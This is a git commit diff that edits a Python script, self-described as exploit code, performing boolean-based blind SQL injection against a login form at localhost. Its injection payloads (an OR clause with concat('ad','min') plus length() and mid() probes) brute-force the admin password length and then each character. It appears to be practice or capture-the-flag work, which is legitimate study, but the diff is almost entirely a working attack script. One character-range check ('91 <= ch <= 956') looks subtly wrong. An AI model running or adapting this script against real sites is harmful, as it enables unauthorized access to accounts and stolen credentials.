628c34929645a32da430943e900e727c73f350f0
haesa <xdhaesa@gmail.com>
2022-11-03 00:37:25 +0900

    chore: exploit 코드 수정

--- index.py
+++ index.py
@@ -4,10 +4,9 @@ url = "http://localhost"
 
 length = 1
 while True:
-    query = "adm%27%2b%27in%20%26%26%20length(pw)%3c{}%23".format(length)
-    print(query)
-    result = requests.post(url, data = {'userId': query, 'userPw': 1})
-    if("환영합니다!" in result.text):
+    id = "' or id=concat('ad', 'min') and length(pw)<{}#".format(length)
+    result = requests.post(url, data = {'username': id, 'password': 1})
+    if("true" in result.text):
         print ("[*] Password length:", length - 1)
         break
     print ("[+] Finding...", length - 1)
@@ -17,9 +16,9 @@ pw = ""
 for i in range(1, length):
     for ch in range(48, 123):
         if (58 <= ch <= 64 or 91 <= ch <= 956): continue
-        query = "adm'+'in' and mid(pw,{},1) like '{}'#".format(i, chr(ch))
-        result = requests.post(url, json = {'id': query, 'pw': '1'})
-        if("환영합니다!" in result.text):
+        id = "' or id=concat('ad', 'min') and mid(pw,{},1)='{}'#".format(i, chr(ch))
+        result = requests.post(url, data = {'username': id, 'password': 1})
+        if("true" in result.text):
             pw += chr(ch)
             print ("[+] Finding...", pw)
             break
